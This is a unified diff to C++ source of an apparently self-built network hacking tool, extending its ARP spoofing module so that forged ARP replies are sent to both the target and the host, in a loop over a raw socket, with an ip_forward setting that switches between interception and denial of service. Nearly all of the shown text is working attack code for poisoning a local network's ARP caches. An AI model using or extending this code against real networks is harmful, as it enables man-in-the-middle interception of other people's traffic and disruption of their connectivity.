@@ -16,7 +16,8 @@ namespace RAChacker
 {
     HackerARP::HackerARP() : uPacketSize(0)
     {
-	bzero(cPacket, sizeof(cPacket));
+	bzero(cPacket[0], sizeof(cPacket[0]));
+	bzero(cPacket[1], sizeof(cPacket[1]));
 	targetIP = RACconf::JsonConfHandler::GetValueFromConfigFile<std::string>("arp_spoof.target");
 	hostIP = RACconf::JsonConfHandler::GetValueFromConfigFile<std::string>("arp_spoof.host");
 	bBothSide = RACconf::JsonConfHandler::GetValueFromConfigFile<bool>("arp_spoof.both");
@@ -27,13 +28,29 @@ namespace RAChacker
 
     void	HackerARP::launchAttack(int socket)
     {
-	LOG(INFO, "ARP LAUNCH ATTACK");
-	HackerUtils::loopHandlerAttackTimer([&]() -> int {  
+	LOG(INFO, "ARP Spoof starting ...");
+	
+	ioctl(socket , SIOCGIFINDEX , &ifr);
+	sll.sll_ifindex = ifr.ifr_ifindex;
 
-		ioctl(socket , SIOCGIFINDEX , &ifr);
-		sll.sll_ifindex = ifr.ifr_ifindex;
-		return sendto(socket, cPacket, uPacketSize, 0, (struct sockaddr*)&sll, sizeof(struct sockaddr_ll));
-		});
+	int i = -1;
+
+	while (i != bBothSide)
+	{
+	    HackerUtils::loopHandlerAttackTimer([&]() -> void { 
+		    while (i != static_cast<int>(bBothSide))
+		    {
+		    ++i;
+		    sendto(socket, cPacket[i], uPacketSize, 0, (struct sockaddr*)&sll, sizeof(struct sockaddr_ll));
+		    memcpy(sll.sll_addr, uMacHost, sizeof(uMacHost));
+
+		    RACdecoder::DecoderLayer decoderLayer(cPacket[i]);
+		    LOG(DEBUG, "This packet will be sent : " << std::endl << decoderLayer.getProtocolDecoded());
+		    }
+		    i = -1;
+		    memcpy(sll.sll_addr, uMacDest, sizeof(uMacDest));
+		    });
+	}
     }
 
     void    HackerARP::makingAttack()
@@ -70,12 +87,9 @@ namespace RAChacker
 	}
 
 	LOG(INFO, "ip_forward set to : " << bDos);
-	memcpy(cPacket, ethernetLayer.getProtocol(), ethernetLayer.getStructSize());
-	memcpy(cPacket + ethernetLayer.getStructSize(), ARPlayer.getProtocol(), ARPlayer.getStructSize());
+	memcpy(cPacket[0], ethernetLayer.getProtocol(), ethernetLayer.getStructSize());
+	memcpy(cPacket[0] + ethernetLayer.getStructSize(), ARPlayer.getProtocol(), ARPlayer.getStructSize());
 	uPacketSize = ethernetLayer.getStructSize() + ARPlayer.getStructSize();
-
-	RACdecoder::DecoderLayer decoderLayer(cPacket);
-	LOG(INFO, "This packet will be sent : " << std::endl << decoderLayer.getProtocolDecoded());
 
 	{
 	    strncpy((char *)ifr.ifr_name, interface.c_str(), interface.length());
@@ -89,6 +103,21 @@ namespace RAChacker
 	    sll.sll_addr[6] = 0x00;
 	    sll.sll_addr[7] = 0x00;
 	    memcpy(sll.sll_addr, uMacDest, sizeof(uMacDest));
+	}
+	if (bBothSide)
+	{
+	    LOG(INFO, "Attack will be sent on both side (Host & target)");	    
+
+	    HackerUtils::computeMacFromLocalIP(hostIP, uMacHost);
+
+	    ethernetLayer.setDestMAC(uMacHost);
+	    //ethernetLayer.setSrcMAC(uMacDest);
+
+	    ARPlayer.setSndrInternetAddr(ntohl((inet_network(targetIP.c_str()))));
+	    ARPlayer.setTgtHdwAddr(uMacHost);
+	    ARPlayer.setTgtInternetAddr(ntohl((inet_network(hostIP.c_str()))));
+	    memcpy(cPacket[1], ethernetLayer.getProtocol(), ethernetLayer.getStructSize());
+	    memcpy(cPacket[1] + ethernetLayer.getStructSize(), ARPlayer.getProtocol(), ARPlayer.getStructSize());
 	}
     }
 }
